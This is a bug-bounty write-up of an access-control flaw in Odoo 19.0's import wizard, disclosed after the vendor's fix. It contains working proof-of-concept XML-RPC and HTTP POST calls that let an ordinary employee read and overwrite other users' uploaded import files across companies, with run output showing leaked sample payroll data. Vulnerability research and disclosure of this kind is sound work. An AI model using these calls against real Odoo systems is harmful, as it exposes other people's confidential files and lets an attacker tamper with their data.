---
layout: post
title: "Odoo base_import.import: the wizard with an ACL and no record rule"
subtitle: "a 12-hour window to read every pending import file in the database, and a one-line HTTP POST to overwrite someone else's upload, both from an ordinary employee account"
date: 2026-10-01
tags: [broken-access-control, odoo, cross-company, transient-model, bug-bounty]
category: research
tldr: "base_import.import holds the file uploaded through the Import button for 12 hours. Its ACL grants base.group_user r/w/c and no ir.rule exists, so Odoo's row-level filter is empty. Any internal user reads and overwrites every other user's pending import, across companies. Reported on Odoo 19.0; closed by Odoo as duplicate of an internal finding and fixed in commit 2fd061b70 on 2026-08-04."
---

## tldr

`base_import.import` is Odoo's hidden holding pen for every file that goes through the standard Import button. It has an ACL that lets every internal user read, write and create, and nothing else. There is no `ir.rule` on the model anywhere in the tree, and Odoo's row-level security defaults to allow-all when no rule exists. So one employee in company B lists every pending import in the database, reads the file bytes out of the record, and, as a bonus, overwrites the file on someone else's row. Rows live 12 hours (`_transient_max_hours = 12.0`). Found on Odoo 19.0, closed as a duplicate: Odoo had the same bug on file internally and had already resolved it.

## the one line that makes this interesting

```
addons/base_import/security/ir.model.access.csv:3
access_base_import_import,access.base_import.import,model_base_import_import,base.group_user,1,1,1,0
```

That is the entire access story for `base_import.import`. Read 1, write 1, create 1, unlink 0, for every `base.group_user`. And there is no `ir.rule` referencing `model_base_import_import` anywhere in `addons/`. With no rule the row filter is empty, so the ACL alone decides, and the ACL does not care who created the row.

The thing people assume saves them is TransientModel. The class is where wizards live, and the folklore is that a TransientModel row is only visible to its creator. The folklore came from the docstring, and the docstring was wrong for five years. Denis Ledoux noted this on 2026-09-02, Odoo commit `710f380fba9b`, in the message of the fix to the docstring itself:

> "Since 6d8688bb124d, TransientModel records use the regular access rights mechanisms instead of being implicitly restricted to their creator. The docstring was not updated with that change and has therefore incorrectly documented creator-only access since 14.0."

A developer who trusted that line added an ACL to this wizard and saw no reason to add a record rule. That is the structural piece. The impact comes from what this particular wizard holds.

## the file bytes live in the row itself

The field is `Binary(..., attachment=False)`:

```python
# addons/base_import/models/base_import.py:187
file = fields.Binary('File', ..., attachment=False)
```

So the uploaded bytes are stored inside the `base_import_import` table, not in `ir.attachment`. Reading the record returns the file content directly, with no attachment ACL in the middle. That is the entire disclosure. There is no second gate.

And this wizard is on every Odoo install, because `base_import` is `auto_install: True` and depends only on `web`:

```python
# addons/base_import/__manifest__.py
'depends': ['web'],
'auto_install': True,
```

A fresh database with only `base` and `web` installed carries it.

## the cross-company read

Two low-privilege accounts, one per company. Alice uploads a `payroll_secret.csv` via Import on company A. Bob logs in on company B and asks the ORM for every `base_import.import` row he can see.

```python
# search as bob (company B), returning rows alice created in company A
rows = models.execute_kw(DB, bob_uid, bob_pw,
    'base_import.import', 'search_read',
    [[]], {'fields': ['id', 'res_model', 'file_name', 'file']})
```

The response contains alice's row id, `res_model='res.partner'`, `file_name='payroll_secret.csv'`, and `file` as a base64 blob of her upload. Decoding it:

```text
name,iban,salary
VICTIM PAYROLL,FR7630001234567890,91000
```

The run output from the PoC:

```text
alice2 uid=7 company=[2, 'CompanyA'] companies=[2]
bob2   uid=8 company=[3, 'CompanyB'] companies=[3]

C0: the two users share no company
  [PASS] alice2 and bob2 have NO company in common -- shared=set()

C1: COMPANY CONTROL. bob2 must not read a CompanyA-scoped record
  [PASS] company boundary is enforced on a normally-scoped model -- bob2 saw []

C2: baseline. bob2 reads base_import.import before alice2 uploads
  bob2 sees 0 row(s) before

C4: THE TEST. bob2 reads alice2's import row and its file
  [PASS] bob2 sees alice2's import row across the company boundary
  bob2 read file_name='payroll_secret.csv'
  bob2 read file content -> 'name,iban,salary\nVICTIM PAYROLL,FR7630001234567890,91000'
  [PASS] bob2 READ the uploaded file contents

C5: [PASS] bob2 WROTE alice2's import row
C6: [PASS] res.users.apikeys (rule-scoped) returns nothing to bob2
  VERDICT: CROSS-COMPANY READ AND WRITE OF UPLOADED IMPORT FILES
```

Two controls carry the proof. `C1` shows the company boundary is enforced for this exact user on a normally-scoped model, so what follows is specific to the unruled wizard and not a broken multi-company setup. `C6` runs the same probe against `res.users.apikeys`, which does have a record rule, and gets nothing, so the probe can detect isolation and the positive result is not a harness artefact. `C2` is the before-shot: bob sees nothing until alice uploads.

## the integrity side: overwriting someone else's import

The same missing rule permits writes. Bob calls `write` on alice's row id and swaps the file and the target model:

```python
models.execute_kw(DB, bob_uid, bob_pw,
    'base_import.import', 'write',
    [[alice_row_id], {
        'file': base64.b64encode(b'name,is_company\nATTACKER_INJECTED_ROW,True\n'),
        'file_name': 'swapped_by_bob.csv',
        'res_model': 'res.partner',
    }])
```

With a negative control first, so the account's privilege is pinned honestly:

```text
NEG CONTROL: bob2 writes a res.partner he does not own (must be denied)
  -> odoo.exceptions.AccessError

EXPLOIT: bob2 overwrites alice2's import file and target model
  write -> {"jsonrpc": "2.0", "id": 1, "result": true}

alice2 now reads her OWN row: file_name='swapped_by_bob.csv' res_model='res.partner'
  content -> 'name,is_company\nATTACKER_INJECTED_ROW,True'
  VERDICT: STORED INTEGRITY ATTACK CONFIRMED
```

The negative control is load-bearing: the same session, the same user, is refused an ordinary `res.partner` write with `AccessError`. He is genuinely low-privileged. He is not refused on the wizard row.

When alice later clicks Import on the wizard, `execute_import` calls `model.load()` as alice, so the attacker-injected row lands in company A under `create_uid = alice`. The attacker gets a record created in a company they cannot otherwise write to, bounded by alice's own rights. Alice sees a preview before confirming, which is why I score the headline on the read.

## the HTTP route: a second way in that does not need XML-RPC

`addons/base_import/controllers/main.py:13-24`:

```python
@http.route('/base_import/set_file', methods=['POST'])
def set_file(self, id):
    file = request.httprequest.files.getlist('ufile')[0]
    written = request.env['base_import.import'].browse(int(id)).write({
        'file': file.read(), 'file_name': file.filename, 'file_type': file.content_type})
```

No `auth=` is declared. The dispatcher defaults it to `auth='user'` (`odoo/http.py:915-918`, `merged_routing = {'auth': 'user', ...}`). The `id` goes straight from the request into `browse(int(id))`, and the `write` is subject to the same missing record rule.

```text
alice3 row id=1, file_name='alice.csv'

NEG CONTROL: portal user hits the same route on the same row
  HTTP 403  body='<!doctype html>... 403 Forbidden ...'

EXPLOIT: bob3 (internal, not the owner) POSTs to /base_import/set_file
  bob3 csrf token obtained: True
  HTTP 200  body='{"result": true}'
```

Read straight from PostgreSQL afterwards:

```text
 1 | bob_swapped.csv | text/csv | name
                                 BOB_OVERWROTE_VIA_HTTP
```

An ordinary multipart POST overwrites another user's pending import. CSRF applies because the route is `type='http'`, so the attacker first fetches their own token from their own session; one extra GET and no obstacle. The portal control returning 403 is the useful half: the route is reachable only from the internal tier, which is why this vector does not lower `PR` to None.

## scoring

`CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N` = **8.5 High**.

| | | |
|---|---|---|
| AV | N | one authenticated JSON-RPC call |
| AC | L | one deterministic request, no race |
| PR | L | the lowest internal tier, `base.group_user` |
| UI | N | no victim interaction for the read |
| S | C | attacker in company B, data read is in company A, which Odoo enforces as a boundary everywhere else (`C1` proves it) |
| C | H | arbitrary uploaded files, which is where bulk PII and bank details enter Odoo |
| I | L | attacker writes rows in another company with no interaction, but only within this wizard model, so bounded |

Four routes to Critical I chased and recorded closed, so the ceiling is not re-litigated:

- Portal or unauthenticated reach: no. The ACL names `base.group_user` and nothing else.
- Code execution via the import: no. `execute_import` runs `model.load()` as the calling user.
- Server file read: no. `_extract_binary_filenames` only collects filenames to echo back to the client.
- `file://` through import-by-URL: no. `_import_file_by_url` asserts `config.get("import_url_regex")`, which defaults to `^(?:http|https)://`.

CWE-1220 Insufficient Granularity of Access Control. Root cause class CWE-266 Incorrect Privilege Assignment.

## wider exposure, same root cause

Sweeping every TransientModel in the tree for the same shape, an ACL granting a low-privilege group and no `ir.rule`, returned **25 models out of 224**. `base_import.import` has the loudest payload because its field holds the uploaded bytes, but others worth fixing in the same pass:

- `base.language.export` (`group_user`, r/w/c) holds exported translation data, lives in `base`, so present everywhere.
- `mrp.production.serials` (`base.group_portal`, r/w/c) is a clean missing-sibling: every other portal-writable model in `mrp_subcontracting` gets a partner-scoping rule, this one did not.
- `sms.composer` and `mail.template.preview` carry internal superuser calls and are writable by any employee.

## remediation

Add a creator-scoping record rule to `base_import.import`:

```xml
<record id="base_import_import_own_rule" model="ir.rule">
    <field name="name">base_import.import: own rows only</field>
    <field name="model_id" ref="base_import.model_base_import_import"/>
    <field name="domain_force">[('create_uid', '=', user.id)]</field>
    <field name="groups" eval="[(4, ref('base.group_user'))]"/>
</record>
```

This is the same shape Odoo already applied to `product.attribute.custom.value` (`product_attribute_custom_value_portal_rule`), so it is a pattern the codebase already accepts.

The class deserves the systemic pass. Since TransientModel stopped isolating by creator in 14.0, every wizard with an ACL and no rule is shared between users. The clean fix is a default creator-scoping rule on TransientModel, or an audit of all 25 models the sweep identified.

## report status and the public fix

Reported through Intigriti on 2026-09-06 against Odoo 19.0. Triage verified on 2026-09-17 and forwarded it to Odoo. Closed on 2026-09-22 as **duplicate**: Odoo already had the finding on file and had already resolved it.

The fix is public, on `odoo/odoo` branch `19.0`, commit [`2fd061b70`](https://github.com/odoo/odoo/commit/2fd061b70426e385e8e12c93f0371f7d475d2c01) dated 2026-08-04, a month before I filed. The commit message, internal ticket `opw-6535276`:

> `[FIX] base_import: scope import records to their owner`
> Ensure import sessions remain scoped to the user who created them.
> This aligns access to temporary import data with its user-specific lifecycle.

What it adds is nine lines, one new file `addons/base_import/security/base_import_security.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<odoo noupdate="1">
    <record id="base_import_import_own_rule" model="ir.rule">
        <field name="name">Import: access own records</field>
        <field name="model_id" ref="model_base_import_import"/>
        <field name="domain_force">[('create_uid', '=', user.id)]</field>
    </record>
</odoo>
```

and the matching line in `__manifest__.py` to load it. That is the creator-scoping rule the remediation section above suggested, essentially character-for-character. No CVE was assigned; Odoo closed it as a routine fix.

Two things worth noting about the fix. First, the rule is not restricted by `groups`, so it applies to every user including administrators, which is tighter than my proposal and the right default for a wizard. Second, the rule is on `base_import.import` only. The 25-model sweep above still applies: the structural problem is that TransientModel stopped isolating by creator in 14.0, and every wizard with an ACL and no rule has the same shape. A per-model fix closes one row at a time.

## references

- [`base_import` on GitHub](https://github.com/odoo/odoo/tree/19.0/addons/base_import)
- [The fix: commit `2fd061b70`](https://github.com/odoo/odoo/commit/2fd061b70426e385e8e12c93f0371f7d475d2c01)
- [TransientModel docstring fix `710f380fba9b`](https://github.com/odoo/odoo/commit/710f380fba9b)
- [CWE-1220: Insufficient Granularity of Access Control](https://cwe.mitre.org/data/definitions/1220.html)
- [CWE-266: Incorrect Privilege Assignment](https://cwe.mitre.org/data/definitions/266.html)
